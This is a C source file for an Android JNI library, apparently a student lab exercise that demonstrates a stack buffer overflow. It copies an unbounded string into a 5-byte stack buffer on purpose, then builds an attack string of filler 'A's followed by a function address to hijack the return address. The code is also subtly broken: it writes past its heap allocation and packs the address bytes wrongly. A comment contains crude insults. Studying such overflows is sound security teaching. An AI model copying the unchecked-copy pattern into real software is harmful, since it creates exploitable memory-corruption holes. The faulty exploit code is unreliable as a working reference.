#include <jni.h>
#include <string.h>
#include <android/log.h>
#define DEBUG_TAG "Proj2Activity"

void overwriteBuffer(const char *str)
{

	__android_log_print(ANDROID_LOG_ERROR, DEBUG_TAG, "Return address = %x", (unsigned int) __builtin_return_address(0));
	char overflowBuffer[5];
    int i;
    for (i = 0 ; i < strlen(str); i++)
    	overflowBuffer[i] = str[i];

    __android_log_print(ANDROID_LOG_ERROR, DEBUG_TAG, "%d", strlen(str));
    __android_log_print(ANDROID_LOG_ERROR, DEBUG_TAG, "In overwriteBuffer");
    __android_log_print(ANDROID_LOG_ERROR, DEBUG_TAG, "Return address = %x",
    		(unsigned int) __builtin_return_address(0));

}

void test_function()
{
	__android_log_print(ANDROID_LOG_ERROR, DEBUG_TAG, "Yay, I was called");
}

jstring
Java_com_example_proj2_MainActivity_overflowBuf(JNIEnv * env, jobject this)
{
    jboolean isCopy;
    /*
    const char *attackString = "This is a long string to overflow the buffer, hope this big string will change "
    		"the return address....Ok, how about now?....Really, are you freaking kidding me...."
    		"Why the heck am I still typing...Stop.....no, seriously stop...."
    		"Dude, are you a fucktard?......Seriously what's wrong with you....."
    		"Sir, you need help....";
    		*/
    char *attackStr = (char *)malloc(1020);
    int i;
    void *func_ptr = &test_function;
    for (i = 0; i < 1019; i++)
    	attackStr[i] = 'A';
    attackStr[i++] = (unsigned int) func_ptr & 0xFF;
    attackStr[i++] = (unsigned int) func_ptr & 0xFF00;
    attackStr[i++] = (unsigned int) func_ptr & 0xFF0000;
    attackStr[i++] = (unsigned int) func_ptr & 0xFF000000;
    attackStr[i] = 0;
    overwriteBuffer(attackStr);
    __android_log_print(ANDROID_LOG_ERROR, DEBUG_TAG, "Oops, should not have printed this line");
    return (*env)->NewStringUTF(env, attackStr);
}
